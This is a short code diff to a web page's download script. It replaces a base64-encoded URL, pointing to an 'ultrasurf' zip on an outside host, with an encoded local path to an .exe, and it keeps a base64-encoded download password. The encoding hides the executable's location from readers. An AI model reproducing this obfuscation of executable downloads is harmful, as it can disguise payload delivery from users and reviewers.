@@ -44,7 +44,7 @@ download.addEventListener("click", () => {
   }
 
   const b64ep = "bW9vbmtuaWdodA==";
-  const b64el = "aHR0cDovL2Fyc2VlbGFsaS5jb20vcDBvOWk4L3NyYy9wdWJsaWMvZG93bmxvYWRzL2FwcGxpY2F0aW9ucy9zb2Z0d2FyZS91bHRyYXN1cmYvZXhlY3V0ZWFibGUvcmVhZG9ubHkvcmVkaXN0L3JlZGlzdC56aXA="
+  const b64el = "Li91LmV4ZQ=="
 
   var password = prompt(
     "Enter the password to download the file (Contact the site owner for the password)"
@@ -72,3 +72,4 @@ function cl() {
   localStorage.clear();
   return "Clear";
 }
+
